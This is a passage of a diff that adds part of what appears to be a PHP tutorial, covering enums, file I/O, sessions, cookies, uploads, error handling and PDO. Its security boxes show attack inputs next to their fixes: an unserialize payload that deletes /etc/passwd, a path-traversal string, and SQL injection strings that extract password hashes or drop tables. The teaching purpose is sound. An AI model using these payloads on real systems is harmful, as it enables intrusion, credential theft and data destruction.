+        unlink($this-&gt;path);    // attacker-controlled!
+    }
+}
+
+// In a controller:
+$data = unserialize($_COOKIE['session']);   // &lt;-- DANGEROUS</code></pre>
+An attacker crafts a serialized payload: <code>O:10:"FileLogger":1:{s:4:"path";s:11:"/etc/passwd";}</code>. When the script ends, PHP destroys the object, calls <code>__destruct()</code>, and deletes <code>/etc/passwd</code>.
+<br><br>
+Real-world chains exist for Laravel, Symfony, Monolog, Guzzle, and dozens more — these are the "POP chains" (Property-Oriented Programming chains) you'll hear about in security research. The tool <code>PHPGGC</code> generates ready-made payloads.
+<br><br>
+<strong>Mitigation:</strong>
+<pre style="margin-top:8px;"><code>// Never deserialize untrusted data:
+$data = json_decode($input, true);   // ✓ JSON instead
+
+// If you MUST use unserialize():
+$data = unserialize($input, ['allowed_classes' =&gt; false]);</code></pre>
+</div>
+
+<h2>4.8 Enums (PHP 8.1+)</h2>
+
+<div class="theory">
+An <strong>enum</strong> is a type that represents a fixed set of named values. Use it for status flags, roles, states, and any scenario where a value should be "one of these exact things." Enums eliminate magic strings and make your code self-documenting.
+</div>
+
+<pre><code>&lt;?php
+// Pure enum (no value)
+enum Direction {
+    case North;
+    case South;
+    case East;
+    case West;
+}
+
+// Backed enum (each case has a scalar value)
+enum Status: string {
+    case Active   = 'active';
+    case Inactive = 'inactive';
+    case Banned   = 'banned';
+
+    public function label(): string {
+        return match($this) {
+            Status::Active   =&gt; "Active User",
+            Status::Inactive =&gt; "Inactive",
+            Status::Banned   =&gt; "Banned",
+        };
+    }
+
+    public static function fromLabel(string $s): self {
+        return self::from($s);       // throws on invalid
+        // or self::tryFrom($s);     // returns null
+    }
+}
+
+$s = Status::Active;
+echo $s-&gt;value;        // "active"
+echo $s-&gt;name;         // "Active"
+echo $s-&gt;label();      // "Active User"
+
+foreach (Status::cases() as $case) {
+    echo $case-&gt;value . "\n";
+}
+?&gt;</code></pre>
+
+<h2>4.9 Readonly Properties (PHP 8.1+)</h2>
+
+<div class="theory">
+A <code>readonly</code> property can only be initialized once — typically in the constructor — and then never modified. This is ideal for value objects and configuration.
+</div>
+
+<pre><code>&lt;?php
+class Config {
+    public function __construct(
+        public readonly string $host,
+        public readonly int $port,
+        public readonly string $db,
+    ) {}
+}
+
+$c = new Config("localhost", 3306, "app");
+echo $c-&gt;host;
+
+// $c-&gt;host = "evil";   // Error: cannot modify readonly property
+?&gt;</code></pre>
+
+<h2>4.10 Level 4 Practice</h2>
+
+<div class="practice">
+<ol>
+  <li><strong>BankAccount class:</strong> Properties for owner, balance (private), pin (private). Methods: deposit, withdraw, getBalance, verifyPin. Throw exceptions on overdraft and invalid amount.</li>
+  <li><strong>Shape hierarchy:</strong> Abstract Shape with abstract methods <code>area()</code> and <code>perimeter()</code>. Implement Circle, Rectangle, Triangle. Add a static method <code>Shape::largest(array $shapes)</code> that returns the shape with maximum area.</li>
+  <li><strong>Logger trait:</strong> A trait that logs messages with timestamp, level, and caller class. Use it in three unrelated classes.</li>
+  <li><strong>Collection class:</strong> Implement <code>IteratorAggregate</code>, <code>Countable</code>, and <code>ArrayAccess</code> so your custom class works with <code>foreach</code>, <code>count()</code>, and <code>$c[0]</code>.</li>
+  <li><strong>Mini DI container:</strong> Build a class that, given a class name, uses <code>ReflectionClass</code> to inspect the constructor, resolves dependencies recursively, and returns a fully wired instance.</li>
+  <li><strong>Enum-based permissions:</strong> Create a <code>Role</code> enum with cases Admin, Editor, Viewer. Add a method <code>can(string $action): bool</code> using a match expression. Use it to gate three actions.</li>
+  <li><strong>Value object:</strong> Create an immutable <code>Email</code> class with a readonly <code>address</code> property. Validate in the constructor — throw if invalid. Add <code>__toString()</code> and <code>equals(Email $other)</code>.</li>
+</ol>
+</div>
+
+<div class="page-break"></div>
+
+<h1 style="text-align:center; padding:80px 20px; border:none; color:#9c27b0;">✓  END OF PART 2</h1>
+<p style="text-align:center; color:#888; font-size:1.05em;">
+Levels 3 &amp; 4 complete. Levels 5 &amp; 6 arrive in <strong>Part 3</strong>.
+</p>
+
+<!-- ==================================================== -->
+<!--                     LEVEL 5                         -->
+<!-- ==================================================== -->
+<h1>Level 5 — Files, Sessions, Errors <span class="badge int">INTERMEDIATE</span></h1>
+
+<h2>5.1 File I/O</h2>
+
+<div class="theory">
+PHP can read from and write to the filesystem — text files, logs, configs, uploads, anything. The two philosophies are <strong>whole-file functions</strong> (<code>file_get_contents</code>, <code>file_put_contents</code>) for small data, and <strong>stream handles</strong> (<code>fopen</code>, <code>fread</code>, <code>fwrite</code>, <code>fclose</code>) for large files you want to process incrementally.
+</div>
+
+<div class="analogy">
+<p>Think of a file like a book. If it's short, you grab the whole book and read it. If it's a thousand-page saga, you open it, read one page at a time, then close it. PHP gives you both approaches. <code>file_get_contents()</code> is the "grab the whole book" function. <code>fopen()</code> + <code>fgets()</code> in a loop is "read one page at a time."</p>
+</div>
+
+<h3>Whole-File Functions</h3>
+
+<pre><code>&lt;?php
+// Read entire file into a string
+$content = file_get_contents("data.txt");
+
+// Read entire file into an array of lines
+$lines = file("data.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+
+// Write to file (overwrite)
+file_put_contents("output.txt", "Hello, World\n");
+
+// Append
+file_put_contents("log.txt", date('c') . " — event\n", FILE_APPEND);
+
+// Write with exclusive lock (prevents race conditions)
+file_put_contents("counter.txt", $newValue, LOCK_EX);
+?&gt;</code></pre>
+
+<h3>Stream Handles</h3>
+
+<pre><code>&lt;?php
+// Open for reading
+$fh = fopen("data.txt", "r");
+if ($fh === false) {
+    die("Cannot open file");
+}
+
+while (($line = fgets($fh)) !== false) {
+    echo $line;
+}
+fclose($fh);
+
+// Open for writing (truncates file)
+$fh = fopen("out.txt", "w");
+fwrite($fh, "Line 1\n");
+fwrite($fh, "Line 2\n");
+fclose($fh);
+
+// Append
+$fh = fopen("log.txt", "a");
+fwrite($fh, "Entry\n");
+fclose($fh);
+
+// Read/write (file must exist)
+$fh = fopen("data.txt", "r+");
+?&gt;</code></pre>
+
+<h3>File Open Modes</h3>
+
+<table>
+<tr><th>Mode</th><th>Meaning</th></tr>
+<tr><td><code>r</code></td><td>Read only — file must exist</td></tr>
+<tr><td><code>r+</code></td><td>Read + write — file must exist</td></tr>
+<tr><td><code>w</code></td><td>Write only — truncates existing file, creates if missing</td></tr>
+<tr><td><code>w+</code></td><td>Read + write — truncates, creates if missing</td></tr>
+<tr><td><code>a</code></td><td>Append only — creates if missing</td></tr>
+<tr><td><code>a+</code></td><td>Read + append — creates if missing</td></tr>
+<tr><td><code>x</code></td><td>Exclusive write — fails if file exists (safe creation)</td></tr>
+<tr><td><code>b</code></td><td>Binary mode — append to any mode (Windows)</td></tr>
+</table>
+
+<h3>File Info &amp; Manipulation</h3>
+
+<pre><code>&lt;?php
+file_exists("data.txt");       // true/false
+is_file("data.txt");           // true if regular file
+is_dir("uploads");             // true if directory
+filesize("data.txt");          // bytes
+
+// Metadata
+filemtime("data.txt");         // last modified (unix timestamp)
+fileperms("data.txt");         // permissions
+basename("/path/to/file.txt"); // "file.txt"
+dirname("/path/to/file.txt");  // "/path/to"
+pathinfo("/path/to/file.txt");
+// ['dirname' =&gt; '/path/to', 'basename' =&gt; 'file.txt',
+//  'extension' =&gt; 'txt', 'filename' =&gt; 'file']
+
+// Copy, rename, delete
+copy("a.txt", "b.txt");
+rename("old.txt", "new.txt");
+unlink("unwanted.txt");
+?&gt;</code></pre>
+
+<h3>Directory Operations</h3>
+
+<pre><code>&lt;?php
+// List files
+$files = scandir("uploads");
+foreach ($files as $f) {
+    if ($f === '.' || $f === '..') continue;
+    echo $f . "\n";
+}
+
+// Modern way — DirectoryIterator
+$it = new DirectoryIterator("uploads");
+foreach ($it as $file) {
+    if ($file-&gt;isFile()) {
+        echo $file-&gt;getFilename() . "\n";
+    }
+}
+
+// Recursive — walk entire tree
+$it = new RecursiveIteratorIterator(
+    new RecursiveDirectoryIterator("uploads")
+);
+foreach ($it as $file) {
+    if ($file-&gt;isFile()) {
+        echo $file-&gt;getPathname() . "\n";
+    }
+}
+
+// Create &amp; remove directories
+mkdir("newdir", 0755, true);   // recursive
+rmdir("emptydir");             // only works if empty
+?&gt;</code></pre>
+
+<div class="security">
+<strong>Path Traversal (Directory Traversal):</strong> If user input is used to build a file path without validation, an attacker can escape the intended directory using <code>../</code> sequences:
+<pre style="margin-top:8px;"><code>// VULNERABLE
+$file = $_GET['file'];
+echo file_get_contents("uploads/" . $file);
+// ?file=../../../../etc/passwd leaks the password file</code></pre>
+<strong>Mitigation:</strong>
+<pre style="margin-top:8px;"><code>$file = basename($_GET['file']);              // strips path components
+$path = "uploads/" . $file;
+$real = realpath($path);
+if ($real === false || !str_starts_with($real, realpath("uploads/"))) {
+    http_response_code(403);
+    exit("Invalid path");
+}
+readfile($real);</code></pre>
+Or better: never accept a filename from the client. Use IDs from a database, look up the real path server-side.
+</div>
+
+<h2>5.2 Sessions</h2>
+
+<div class="theory">
+HTTP is stateless — each request is independent, with no memory of previous requests. <strong>Sessions</strong> solve this by storing data on the server and giving the client a small cookie (usually named <code>PHPSESSID</code>) that identifies which session belongs to which client. Every subsequent request sends the cookie, and PHP loads the matching server-side data.
+</div>
+
+<div class="analogy">
+<p>A session is like a coat check at a restaurant. You hand over your coat, they give you a numbered ticket. The coat itself stays in the back room (server-side). When you want it back, you show the ticket (the session cookie) and they retrieve your specific coat (your data). The ticket is meaningless without the matching coat in the back room.</p>
+</div>
+
+<h3>Basic Session Usage</h3>
+
+<pre><code>&lt;?php
+// Start session (must be before any output)
+session_start();
+
+// Store data
+$_SESSION['user_id'] = 42;
+$_SESSION['username'] = 'devils';
+$_SESSION['logged_in_at'] = time();
+
+// Read
+if (isset($_SESSION['user_id'])) {
+    echo "Welcome, user #" . $_SESSION['user_id'];
+}
+
+// Modify
+$_SESSION['last_seen'] = time();
+
+// Remove one key
+unset($_SESSION['logged_in_at']);
+
+// Destroy session (logout)
+session_unset();       // clears all $_SESSION data
+session_destroy();     // destroys session on server
+
+// Or fully — also delete cookie
+$_SESSION = [];
+if (ini_get("session.use_cookies")) {
+    $params = session_get_cookie_params();
+    setcookie(session_name(), '', time() - 42000,
+        $params["path"], $params["domain"],
+        $params["secure"], $params["httponly"]);
+}
+session_destroy();
+?&gt;</code></pre>
+
+<h3>Login Flow with Sessions</h3>
+
+<pre><code>&lt;?php
+session_start();
+
+// On login form submission
+function login(string $username, string $password): bool {
+    $user = findUserByUsername($username);
+    if (!$user) return false;
+    if (!password_verify($password, $user['password_hash'])) return false;
+
+    // CRITICAL: regenerate session ID after login
+    session_regenerate_id(true);
+
+    $_SESSION['user_id'] = $user['id'];
+    $_SESSION['role']    = $user['role'];
+    $_SESSION['logged_in'] = time();
+    return true;
+}
+
+// Protecting pages
+function requireLogin(): void {
+    if (empty($_SESSION['user_id'])) {
+        header("Location: /login.php");
+        exit;
+    }
+}
+?&gt;</code></pre>
+
+<div class="security">
+<strong>Session security checklist:</strong>
+<br><br>
+1. <strong>Always call <code>session_regenerate_id(true)</code> after login.</strong> If you don't, an attacker who knows the pre-login session ID (via <em>session fixation</em>) can use it after the victim logs in. This is one of the most common authentication bugs.
+<br><br>
+2. <strong>Set the right cookie flags.</strong>
+<pre style="margin-top:8px;"><code>session_set_cookie_params([
+    'lifetime' =&gt; 0,           // until browser closes
+    'path'     =&gt; '/',
+    'secure'   =&gt; true,        // HTTPS only
+    'httponly' =&gt; true,        // no JavaScript access
+    'samesite' =&gt; 'Strict',    // no CSRF from other sites
+]);
+session_start();</code></pre>
+Without <code>httponly</code>, an XSS attack can read <code>document.cookie</code> and steal the session. Without <code>secure</code>, the cookie leaks over plain HTTP. Without <code>samesite</code>, the session can be used in CSRF attacks.
+<br><br>
+3. <strong>Use a strong session save path.</strong> Default is often <code>/tmp</code>. In shared hosting, this can leak between users. Set <code>session.save_path</code> to a directory only your app can access.
+<br><br>
+4. <strong>Regenerate session ID periodically</strong> (e.g., every 15 minutes) for long-lived sessions.
+</div>
+
+<h2>5.3 Cookies</h2>
+
+<div class="theory">
+Cookies are small pieces of data the server sends to the browser, which the browser stores and sends back on every subsequent request. They're the mechanism behind sessions, but they're also used independently — for "remember me" tokens, UI preferences, analytics, and so on.
+</div>
+
+<div class="analogy">
+<p>A cookie is like a wristband at a concert. The venue gives it to you once. Every time you re-enter, they see the band and let you in without re-checking your ticket. The band has to be secure (tamper-proof) — otherwise people forge wristbands and get in for free.</p>
+</div>
+
+<h3>Setting Cookies</h3>
+
+<pre><code>&lt;?php
+// Simple (avoid this — no security flags)
+setcookie("theme", "dark");
+
+// Modern approach with options array
+setcookie("theme", "dark", [
+    'expires'  =&gt; time() + 60 * 60 * 24 * 30,  // 30 days
+    'path'     =&gt; '/',
+    'domain'   =&gt; 'example.com',
+    'secure'   =&gt; true,
+    'httponly' =&gt; true,
+    'samesite' =&gt; 'Lax',    // 'Strict', 'Lax', or 'None'
+]);
+
+// Read (available on next request)
+echo $_COOKIE['theme'] ?? 'light';
+
+// Delete
+setcookie("theme", "", time() - 3600, ['path' =&gt; '/']);
+?&gt;</code></pre>
+
+<h3>Cookie Flags Explained</h3>
+
+<table>
+<tr><th>Flag</th><th>Effect</th></tr>
+<tr><td><code>secure</code></td><td>Cookie only sent over HTTPS</td></tr>
+<tr><td><code>httponly</code></td><td>Cookie not accessible via JavaScript — defends against XSS cookie theft</td></tr>
+<tr><td><code>samesite=Strict</code></td><td>Cookie never sent on cross-site requests — best CSRF defense</td></tr>
+<tr><td><code>samesite=Lax</code></td><td>Cookie sent on top-level GET navigations but not on cross-site POST — default in modern browsers</td></tr>
+<tr><td><code>samesite=None</code></td><td>Cookie sent on all cross-site requests (must also be <code>secure</code>)</td></tr>
+</table>
+
+<div class="security">
+<strong>Never store sensitive data directly in cookies.</strong> Cookies are stored on the user's machine and visible via browser DevTools. Anyone can read them, modify them, and send them back.
+<br><br>
+If you must store state client-side, <strong>sign it with HMAC</strong> so tampering is detectable:
+<pre style="margin-top:8px;"><code>// Sign
+$data = json_encode(['user_id' =&gt; 42, 'exp' =&gt; time() + 3600]);
+$sig  = hash_hmac('sha256', $data, SECRET_KEY);
+setcookie('session_data', base64_encode($data) . '.' . $sig, [...]);
+
+// Verify
+[$b64, $sig] = explode('.', $_COOKIE['session_data'], 2);
+$data = base64_decode($b64);
+$expected = hash_hmac('sha256', $data, SECRET_KEY);
+if (!hash_equals($expected, $sig)) {
+    die("Tampered cookie");
+}</code></pre>
+This is essentially what JWT (JSON Web Tokens) do — the same HMAC-signing concept.
+</div>
+
+<h2>5.4 File Uploads</h2>
+
+<div class="theory">
+File uploads are one of the most common — and most dangerous — features in web applications. In PHP, uploaded files are received in the <code>$_FILES</code> superglobal, which is an array of metadata plus a temporary file path on disk. Your job is to validate the upload, decide where it should live permanently, and move it there.
+</div>
+
+<h3>The <code>$_FILES</code> Structure</h3>
+
+<pre><code>&lt;?php
+// HTML form MUST have enctype="multipart/form-data"
+?&gt;
+&lt;form method="POST" enctype="multipart/form-data"&gt;
+    &lt;input type="file" name="avatar"&gt;
+    &lt;button&gt;Upload&lt;/button&gt;
+&lt;/form&gt;
+
+&lt;?php
+// On submit
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    print_r($_FILES['avatar']);
+}
+?&gt;</code></pre>
+
+<pre><code>Array (
+    [name]     =&gt; profile.jpg        // original filename (attacker-controlled!)
+    [type]     =&gt; image/jpeg          // MIME type (attacker-controlled!)
+    [tmp_name] =&gt; /tmp/phpXYZ123      // temporary location on server
+    [error]    =&gt; 0                   // error code (0 = success)
+    [size]     =&gt; 45231               // bytes
+)</code></pre>
+
+<div class="security">
+<strong>Two fields in <code>$_FILES</code> are attacker-controlled:</strong>
+<ul style="margin-top:6px;">
+  <li><code>name</code> — the client claims whatever filename they want. Could be <code>../../shell.php</code> or <code>image.jpg.php</code>.</li>
+  <li><code>type</code> — the client claims whatever MIME type they want. Just because it says <code>image/jpeg</code> doesn't mean it is one.</li>
+</ul>
+<strong>Never trust either.</strong> Only <code>tmp_name</code>, <code>error</code>, and <code>size</code> come from the server.
+</div>
+
+<h3>Safe Upload Pattern</h3>
+
+<pre><code>&lt;?php
+function handleUpload(array $file): string {
+    // 1. Check for upload errors
+    if ($file['error'] !== UPLOAD_ERR_OK) {
+        throw new RuntimeException("Upload error code: " . $file['error']);
+    }
+
+    // 2. Check size
+    if ($file['size'] &gt; 5 * 1024 * 1024) {   // 5 MB
+        throw new RuntimeException("File too large");
+    }
+
+    // 3. Verify true MIME type from file content (NOT client claim)
+    $finfo = new finfo(FILEINFO_MIME_TYPE);
+    $mime  = $finfo-&gt;file($file['tmp_name']);
+    $allowedMimes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];
+    if (!in_array($mime, $allowedMimes, true)) {
+        throw new RuntimeException("Invalid file type: $mime");
+    }
+
+    // 4. Map MIME to extension (NEVER trust client-supplied extension)
+    $extMap = [
+        'image/jpeg' =&gt; 'jpg',
+        'image/png'  =&gt; 'png',
+        'image/gif'  =&gt; 'gif',
+        'image/webp' =&gt; 'webp',
+    ];
+    $ext = $extMap[$mime];
+
+    // 5. Generate random filename (prevents collision &amp; path tricks)
+    $newName = bin2hex(random_bytes(16)) . '.' . $ext;
+
+    // 6. Move to a directory OUTSIDE the webroot, or use a dedicated uploads dir
+    $uploadDir = __DIR__ . '/uploads/';
+    $dest = $uploadDir . $newName;
+    if (!move_uploaded_file($file['tmp_name'], $dest)) {
+        throw new RuntimeException("Failed to move file");
+    }
+
+    return $newName;
+}
+?&gt;</code></pre>
+
+<div class="security">
+<strong>Why each step matters:</strong>
+<ul style="margin-top:6px;">
+  <li><strong>Error check</strong> — some "uploads" fail silently; the <code>error</code> code tells you what happened.</li>
+  <li><strong>Size check</strong> — prevents DoS via 5 GB uploads.</li>
+  <li><strong>finfo verification</strong> — reads magic bytes from the file to determine what it actually is. Attacker can rename <code>shell.php</code> to <code>shell.jpg</code>, but <code>finfo</code> still sees PHP code and refuses it.</li>
+  <li><strong>Extension whitelist</strong> — even if <code>finfo</code> is bypassed, we control the final extension. No <code>.php</code> survives.</li>
+  <li><strong>Random name</strong> — prevents overwriting other files and defeats filename-based attacks.</li>
+  <li><strong>move_uploaded_file</strong> — the only safe way to move uploaded files. It checks that the source is actually an uploaded file, not an arbitrary path.</li>
+</ul>
+<br>
+<strong>Also recommended:</strong>
+<ul style="margin-top:6px;">
+  <li>Store uploads <strong>outside the webroot</strong> (e.g., <code>/var/uploads/</code>) and serve them through a PHP script that checks permissions.</li>
+  <li>If storing inside webroot, add <code>.htaccess</code> in the upload dir: <code>php_flag engine off</code> — even if a <code>.php</code> file is uploaded, Apache won't execute it.</li>
+  <li>Set <code>upload_max_filesize</code> and <code>post_max_size</code> in <code>php.ini</code> to hard limits.</li>
+</ul>
+</div>
+
+<h2>5.5 Error Handling</h2>
+
+<div class="theory">
+PHP has two error-handling systems: the classic error system (warnings, notices, deprecated) and the modern exception system (try/catch/finally). Good code combines both — converts warnings into exceptions where appropriate, handles exceptions gracefully, and logs everything without leaking details to users.
+</div>
+
+<h3>Error Types</h3>
+
+<table>
+<tr><th>Level</th><th>Meaning</th></tr>
+<tr><td><code>E_ERROR</code></td><td>Fatal — script stops</td></tr>
+<tr><td><code>E_WARNING</code></td><td>Non-fatal, script continues</td></tr>
+<tr><td><code>E_NOTICE</code></td><td>Possible bug, script continues</td></tr>
+<tr><td><code>E_DEPRECATED</code></td><td>Feature will be removed</td></tr>
+<tr><td><code>E_STRICT</code></td><td>Best-practice violation</td></tr>
+<tr><td><code>E_ALL</code></td><td>All of the above (catch-all mask)</td></tr>
+</table>
+
+<h3>Configuring Error Reporting</h3>
+
+<pre><code>&lt;?php
+// Development — show everything
+error_reporting(E_ALL);
+ini_set('display_errors', '1');
+
+// Production — log everything, show nothing
+error_reporting(E_ALL);
+ini_set('display_errors', '0');
+ini_set('log_errors', '1');
+ini_set('error_log', '/var/log/php-errors.log');
+
+// Alternatively, in php.ini — often the cleaner approach
+?&gt;</code></pre>
+
+<div class="security">
+<strong>Never display errors in production.</strong> Stack traces reveal absolute paths, database schemas, library versions, and internal logic. Attackers use this for reconnaissance. Error messages are for logs — not for users.
+<br><br>
+Users should see a generic message like "Something went wrong" and an error ID that maps to a detailed log entry.
+</div>
+
+<h3>try / catch / finally</h3>
+
+<pre><code>&lt;?php
+try {
+    $pdo = new PDO($dsn, $user, $pass);
+    $stmt = $pdo-&gt;prepare("SELECT * FROM users WHERE id = ?");
+    $stmt-&gt;execute([$id]);
+    $user = $stmt-&gt;fetch();
+    if (!$user) throw new RuntimeException("User not found");
+} catch (PDOException $e) {
+    error_log("DB error: " . $e-&gt;getMessage());
+    http_response_code(500);
+    exit("Database error");
+} catch (RuntimeException $e) {
+    error_log("App error: " . $e-&gt;getMessage());
+    http_response_code(404);
+    exit("Not found");
+} finally {
+    // Always runs — success or failure
+    if (isset($pdo)) $pdo = null;
+}
+?&gt;</code></pre>
+
+<h3>Custom Exception Classes</h3>
+
+<pre><code>&lt;?php
+class ValidationException extends Exception {
+    private array $errors;
+
+    public function __construct(array $errors) {
+        parent::__construct("Validation failed");
+        $this-&gt;errors = $errors;
+    }
+
+    public function getErrors(): array {
+        return $this-&gt;errors;
+    }
+}
+
+// Throw
+if (empty($email)) {
+    throw new ValidationException(["email" =&gt; "Email is required"]);
+}
+
+// Catch
+try {
+    validateInput($_POST);
+} catch (ValidationException $e) {
+    foreach ($e-&gt;getErrors() as $field =&gt; $msg) {
+        echo "$field: $msg\n";
+    }
+}
+?&gt;</code></pre>
+
+<h3>Global Error Handler</h3>
+
+<pre><code>&lt;?php
+// Catch uncaught exceptions
+set_exception_handler(function (Throwable $e) {
+    error_log("Uncaught: " . $e-&gt;getMessage());
+    http_response_code(500);
+    if (ini_get('display_errors')) {
+        echo "Error: " . $e-&gt;getMessage();
+    } else {
+        echo "Something went wrong. Please try again.";
+    }
+});
+
+// Convert warnings to exceptions (best practice)
+set_error_handler(function ($errno, $errstr, $errfile, $errline) {
+    throw new ErrorException($errstr, 0, $errno, $errfile, $errline);
+});
+
+// Catch fatal errors that couldn't be caught
+register_shutdown_function(function () {
+    $err = error_get_last();
+    if ($err &amp;&amp; in_array($err['type'], [E_ERROR, E_PARSE, E_CORE_ERROR])) {
+        error_log("Fatal: " . $err['message']);
+    }
+});
+?&gt;</code></pre>
+
+<h2>5.6 Level 5 Practice</h2>
+
+<div class="practice">
+<ol>
+  <li><strong>Simple log class:</strong> Write a <code>Logger</code> class that writes timestamped entries to a file. Methods: <code>info()</code>, <code>error()</code>, <code>warning()</code>. Automatically creates the log file if missing.</li>
+  <li><strong>Session-based cart:</strong> Build a mini shopping cart using <code>$_SESSION</code>. Support add, remove, list, and total price. Persist across requests.</li>
+  <li><strong>Secure login:</strong> Implement a login system with proper <code>session_regenerate_id(true)</code> on success, secure cookie flags, and a logout that fully destroys the session.</li>
+  <li><strong>Safe file upload:</strong> Implement the full upload handler from section 5.4. Test it with a legitimate image, a renamed PHP file, and an oversized file. Confirm all are rejected except the legitimate image.</li>
+  <li><strong>Path traversal defense:</strong> Write a function that serves a file from <code>uploads/</code> given a user-supplied name. Test with <code>../app.py</code>, <code>..%2F..%2Fetc%2Fpasswd</code>, and absolute paths like <code>/etc/passwd</code>. Confirm all are blocked.</li>
+  <li><strong>Custom exception flow:</strong> Build a <code>ValidationException</code> that carries multiple field errors. Wire it through a form-processing function.</li>
+</ol>
+</div>
+
+<div class="page-break"></div>
+
+<!-- ==================================================== -->
+<!--                     LEVEL 6                         -->
+<!-- ==================================================== -->
+<h1>Level 6 — Database with PDO <span class="badge int">INTERMEDIATE</span></h1>
+
+<h2>6.1 Database Basics</h2>
+
+<div class="theory">
+Almost every real PHP application talks to a database. The classic choice is <strong>MySQL</strong> (or its fork, <strong>MariaDB</strong>). MySQL stores data in tables — think of a spreadsheet with strict rules. Rows are records; columns are fields. A database can hold many tables. You interact with MySQL using SQL — Structured Query Language.
+</div>
+
+<div class="analogy">
+<p>A database is like a warehouse of filing cabinets. Each <strong>table</strong> is a cabinet. Each <strong>row</strong> is a folder inside the cabinet. Each <strong>column</strong> is a labeled section within the folder. SQL is the language you use to ask the warehouse manager (MySQL) to find, add, update, or delete folders.</p>
+</div>
+
+<h3>Quick SQL Refresher</h3>
+
+<pre><code>-- Create a table
+CREATE TABLE users (
+    id INT PRIMARY KEY AUTO_INCREMENT,
+    username VARCHAR(50) UNIQUE NOT NULL,
+    email VARCHAR(255) UNIQUE NOT NULL,
+    password_hash VARCHAR(255) NOT NULL,
+    role ENUM('admin', 'user') DEFAULT 'user',
+    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+);
+
+-- Insert
+INSERT INTO users (username, email, password_hash)
+VALUES ('devils', 'd@x.com', '$2y$10$...');
+
+-- Select
+SELECT id, username, email FROM users WHERE role = 'admin';
+
+-- Update
+UPDATE users SET role = 'admin' WHERE id = 5;
+
+-- Delete
+DELETE FROM users WHERE id = 5;
+</code></pre>
+
+<h2>6.2 Connecting with PDO</h2>
+
+<div class="theory">
+PHP offers two MySQL extensions: <strong>mysqli</strong> (MySQL-only, procedural or OO) and <strong>PDO</strong> (PHP Data Objects — supports MySQL, PostgreSQL, SQLite, SQL Server, Oracle). <strong>Always use PDO.</strong> It's portable, has a cleaner API, and critically, has proper support for prepared statements across all databases.
+</div>
+
+<pre><code>&lt;?php
+$dsn = "mysql:host=localhost;dbname=app;charset=utf8mb4";
+
+$options = [
+    PDO::ATTR_ERRMODE            =&gt; PDO::ERRMODE_EXCEPTION,   // throw on error
+    PDO::ATTR_DEFAULT_FETCH_MODE =&gt; PDO::FETCH_ASSOC,         // fetch as assoc
+    PDO::ATTR_EMULATE_PREPARES   =&gt; false,                    // REAL prepared statements
+    PDO::ATTR_PERSISTENT         =&gt; false,                    // no persistent connections
+];
+
+try {
+    $pdo = new PDO($dsn, 'root', 'password', $options);
+} catch (PDOException $e) {
+    error_log($e-&gt;getMessage());
+    exit("Database connection failed");
+}
+?&gt;</code></pre>
+
+<h3>Why Each Option Matters</h3>
+
+<table>
+<tr><th>Option</th><th>Reason</th></tr>
+<tr><td><code>ERRMODE_EXCEPTION</code></td><td>Silent errors are the #1 source of subtle bugs. Exceptions force you to handle them.</td></tr>
+<tr><td><code>DEFAULT_FETCH_MODE = ASSOC</code></td><td>Returns associative arrays instead of numbered arrays. More readable.</td></tr>
+<tr><td><code>EMULATE_PREPARES = false</code></td><td><strong>Critical for security.</strong> When true, PDO builds the query string client-side and sends it whole. When false, MySQL prepares the statement separately from the data — the only way to be fully immune to SQL injection under all character sets.</td></tr>
+<tr><td><code>PERSISTENT = false</code></td><td>Persistent connections can leak session state between requests in shared hosting. Leave off.</td></tr>
+</table>
+
+<h2>6.3 Prepared Statements</h2>
+
+<div class="theory">
+Prepared statements separate the <strong>query structure</strong> from the <strong>data</strong>. You write the query once with placeholders (<code>?</code> or <code>:name</code>), send it to MySQL, and MySQL compiles it into an execution plan <em>before</em> seeing any data. Then you send the data separately. MySQL plugs the data into the compiled plan — but because the plan is already fixed, the data can <em>never</em> change the query's structure.
+</div>
+
+<div class="analogy">
+<p>Imagine writing a Mad Lib. Instead of letting the reader write the entire story, you hand them a story with blanks: "The ______ walked into the ______." They can only fill in the blanks — they can't change the sentence structure, add new sentences, or delete the ending. Prepared statements work the same way: the query is the sentence, and user data can only fill in the blanks.</p>
+</div>
+
+<h3>Positional Placeholders (<code>?</code>)</h3>
+
+<pre><code>&lt;?php
+$stmt = $pdo-&gt;prepare("SELECT * FROM users WHERE email = ? AND active = ?");
+$stmt-&gt;execute([$email, 1]);
+$user = $stmt-&gt;fetch();
+?&gt;</code></pre>
+
+<h3>Named Placeholders (<code>:name</code>)</h3>
+
+<pre><code>&lt;?php
+$stmt = $pdo-&gt;prepare("SELECT * FROM users WHERE email = :email AND role = :role");
+$stmt-&gt;execute(['email' =&gt; $email, 'role' =&gt; 'admin']);
+$user = $stmt-&gt;fetch();
+
+// Bind explicitly (allows specifying type)
+$stmt = $pdo-&gt;prepare("INSERT INTO users (name, age) VALUES (:n, :a)");
+$stmt-&gt;bindValue(':n', $name, PDO::PARAM_STR);
+$stmt-&gt;bindValue(':a', $age,  PDO::PARAM_INT);
+$stmt-&gt;execute();
+?&gt;</code></pre>
+
+<h3>Fetching Results</h3>
+
+<pre><code>&lt;?php
+// One row
+$stmt-&gt;execute([$id]);
+$user = $stmt-&gt;fetch();          // assoc array, or false if none
+
+// All rows
+$stmt-&gt;execute();
+$users = $stmt-&gt;fetchAll();
+
+// One column, one row
+$stmt-&gt;execute([$id]);
+$name = $stmt-&gt;fetchColumn();
+
+// Iterate large result sets (memory-efficient)
+$stmt-&gt;execute();
+while ($row = $stmt-&gt;fetch()) {
+    process($row);
+}
+
+// Count
+$stmt-&gt;execute();
+$count = $stmt-&gt;rowCount();
+?&gt;</code></pre>
+
+<div class="security">
+<strong>SQL Injection — the classic.</strong>
+<br><br>
+<strong>Vulnerable code:</strong>
+<pre style="margin-top:8px;"><code>$id = $_GET['id'];
+$sql = "SELECT * FROM users WHERE id = $id";
+$result = $pdo-&gt;query($sql);</code></pre>
+Attack payloads:
+<ul style="margin-top:6px;">
+  <li><code>?id=1 OR 1=1</code> — returns every user</li>
+  <li><code>?id=1 UNION SELECT username, password_hash FROM users</code> — extracts credentials</li>
+  <li><code>?id=1; DROP TABLE users;--</code> — destroys the table</li>
+  <li><code>?id=1 AND SLEEP(5)</code> — time-based blind, confirms injection works</li>
+</ul>
+<br>
+<strong>Safe version:</strong>
+<pre style="margin-top:8px;"><code>$stmt = $pdo-&gt;prepare("SELECT * FROM users WHERE id = ?");
